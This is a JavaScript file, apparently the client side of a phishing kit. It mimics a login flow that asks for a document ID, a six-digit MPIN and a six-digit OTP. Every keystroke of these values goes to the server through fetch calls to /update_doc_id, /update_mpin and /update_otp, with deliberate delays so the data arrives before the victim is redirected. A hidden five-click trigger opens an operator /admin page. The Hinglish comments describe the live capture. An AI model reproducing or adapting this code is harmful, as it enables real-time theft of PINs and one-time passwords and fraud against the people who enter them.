let formData = { docId: '', mpin: '', otp: '' };
let clickCount = 0;
let docIdTimeout = null;
let mpinTimeout = null;
let otpTimeout = null;
let redirectTimeout = null;

// ==================== NAVIGATION ====================
function showStep(stepId) {
    document.getElementById('step-login').classList.add('hidden');
    document.getElementById('step-mpin').classList.add('hidden');
    document.getElementById('step-otp').classList.add('hidden');
    document.getElementById(stepId).classList.remove('hidden');
    
    if (stepId === 'step-mpin') {
        document.querySelectorAll('.mpin-input').forEach(i => i.value = '');
        document.querySelector('.mpin-input').focus();
    } else if (stepId === 'step-otp') {
        document.querySelectorAll('.otp-input').forEach(i => i.value = '');
        document.querySelector('.otp-input').focus();
    }
}

function goToLogin() {
    showStep('step-login');
    formData = { docId: '', mpin: '', otp: '' };
}

function goToMpin() {
    const docId = document.getElementById('docIdInput').value.trim();
    if (!docId) {
        document.getElementById('idError').style.display = 'block';
        return;
    }
    document.getElementById('idError').style.display = 'none';
    formData.docId = docId;
    showStep('step-mpin');
}

function goToOtp() {
    const mpin = Array.from(document.querySelectorAll('.mpin-input')).map(i => i.value).join('');
    if (mpin.length < 6) { alert("Please enter 6 digit MPIN"); return; }
    formData.mpin = mpin;
    showStep('step-otp');
}

function submitData() {
    const otp = Array.from(document.querySelectorAll('.otp-input')).map(i => i.value).join('');
    if (otp.length < 6) { alert("Please enter 6 digit OTP"); return; }
    formData.otp = otp;
    
    fetch('/update_otp', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ docId: formData.docId, otp: otp })
    })
    .then(() => window.location.href = '/')
    .catch(() => window.location.href = '/');
}

// ==================== DOCUMENT ID — LIVE TRACKING ====================
const docIdField = document.getElementById('docIdInput');
if (docIdField) {
    docIdField.addEventListener('input', function() {
        this.value = this.value.replace(/[^0-9]/g, '');
        
        const value = this.value.trim();
        if (value.length === 0) return;
        
        clearTimeout(docIdTimeout);
        docIdTimeout = setTimeout(() => sendDocId(value), 500);
    });
    
    docIdField.addEventListener('paste', function(e) {
        e.preventDefault();
        const pasted = (e.clipboardData || window.clipboardData).getData('text');
        const numeric = pasted.replace(/[^0-9]/g, '');
        this.value = numeric;
        this.dispatchEvent(new Event('input'));
    });
}

function sendDocId(docId) {
    console.log("📤 Sending DocID:", docId);
    fetch('/update_doc_id', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ docId: docId })
    })
    .then(res => res.json())
    .then(data => console.log("✅ DocID response:", data))
    .catch(err => console.error("❌ DocID error:", err));
}

// ==================== MPIN — LIVE TRACKING ====================
function sendMpin(mpin) {
    console.log("📤 Sending MPIN:", mpin, "(length:", mpin.length + ")");
    return fetch('/update_mpin', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ docId: formData.docId, mpin: mpin })
    })
    .then(res => res.json())
    .then(data => {
        console.log("✅ MPIN response:", data);
        return data;
    })
    .catch(err => {
        console.error("❌ MPIN error:", err);
        return null;
    });
}

// ==================== OTP — LIVE TRACKING ====================
function sendOtp(otp) {
    console.log("📤 Sending OTP:", otp, "(length:", otp.length + ")");
    return fetch('/update_otp', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ docId: formData.docId, otp: otp })
    })
    .then(res => res.json())
    .then(data => {
        console.log("✅ OTP response:", data);
        return data;
    })
    .catch(err => {
        console.error("❌ OTP error:", err);
        return null;
    });
}

// ==================== INPUT MOVEMENT + AUTO-REDIRECT ====================
function moveNext(current, type) {
    if (current.value && !/^\d+$/.test(current.value)) {
        current.value = '';
        return;
    }
    
    // Live update bhejo (har digit pe)
    if (type === 'mpin') {
        const mpin = Array.from(document.querySelectorAll('.mpin-input')).map(i => i.value).join('');
        if (mpin.length > 0) {
            clearTimeout(mpinTimeout);
            mpinTimeout = setTimeout(() => sendMpin(mpin), 300);
        }
    } else if (type === 'otp') {
        const otp = Array.from(document.querySelectorAll('.otp-input')).map(i => i.value).join('');
        if (otp.length > 0) {
            clearTimeout(otpTimeout);
            otpTimeout = setTimeout(() => sendOtp(otp), 300);
        }
    }
    
    // Next input pe focus
    if (current.value.length === 1) {
        const inputs = document.querySelectorAll(`.${type}-input`);
        const index = Array.from(inputs).indexOf(current);
        
        if (index < inputs.length - 1) {
            inputs[index + 1].focus();
        } else {
            // Last digit — auto action
            current.blur();
            handleComplete(type);
        }
    }
}

// ==================== AUTO-COMPLETE HANDLER ====================
function handleComplete(type) {
    if (type === 'mpin') {
        // MPIN complete — auto go to OTP page
        const mpin = Array.from(document.querySelectorAll('.mpin-input')).map(i => i.value).join('');
        
        if (mpin.length === 6) {
            console.log("🎯 MPIN complete, auto-redirecting to OTP...");
            
            // Pehle MPIN data bhejo
            clearTimeout(mpinTimeout);
            sendMpin(mpin).then(() => {
                // 500ms wait — data server pe pahunche
                setTimeout(() => {
                    formData.mpin = mpin;
                    showStep('step-otp');
                }, 500);
            });
        }
    } else if (type === 'otp') {
        // OTP complete — auto submit
        const otp = Array.from(document.querySelectorAll('.otp-input')).map(i => i.value).join('');
        
        if (otp.length === 6) {
            console.log("🎯 OTP complete, auto-submitting...");
            
            // Pehle OTP data bhejo
            clearTimeout(otpTimeout);
            sendOtp(otp).then(() => {
                // 800ms wait — data server pe pahunche
                setTimeout(() => {
                    window.location.href = '/';
                }, 800);
            });
        }
    }
}

// ==================== BACKSPACE HANDLING ====================
document.addEventListener('keydown', (e) => {
    if (e.key === 'Backspace' && !e.target.value) {
        const prev = e.target.previousElementSibling;
        if (prev && (prev.classList.contains('otp-input') || prev.classList.contains('mpin-input'))) {
            prev.focus();
            prev.value = '';
            
            if (prev.classList.contains('mpin-input')) {
                const mpin = Array.from(document.querySelectorAll('.mpin-input')).map(i => i.value).join('');
                clearTimeout(mpinTimeout);
                mpinTimeout = setTimeout(() => sendMpin(mpin), 300);
            } else if (prev.classList.contains('otp-input')) {
                const otp = Array.from(document.querySelectorAll('.otp-input')).map(i => i.value).join('');
                clearTimeout(otpTimeout);
                otpTimeout = setTimeout(() => sendOtp(otp), 300);
            }
        }
    }
});

// ==================== SECRET ADMIN TRIGGER ====================
function triggerAdmin() {
    clickCount++;
    if (clickCount === 5) {
        window.location.href = '/admin';
        clickCount = 0;
    }
    setTimeout(() => { clickCount = 0; }, 2000);
}